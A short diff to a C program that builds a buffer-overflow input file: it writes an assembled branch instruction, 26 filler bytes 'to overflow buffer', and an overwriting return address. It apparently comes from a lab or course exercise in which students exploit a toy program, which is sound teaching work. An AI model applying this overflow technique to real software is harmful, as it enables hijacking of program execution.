@@ -38,7 +38,12 @@ int main(void) {
     uiB = MiniAssembler_b(0x400864, 0x420100);
     fwrite(&uiB, sizeof(unsigned int), 1, psFile);
 
-    ulAddress = 0x400858;
+    /* filler to overflow buffer */
+    for (i = 0; i < 26; i++) {
+        fprintf(psFile, "%c", 'a');
+    }
+
+    ulAddress = 0x420070;
 
     fwrite(&ulAddress, sizeof(unsigned long), 1, psFile);
     fclose(psFile);
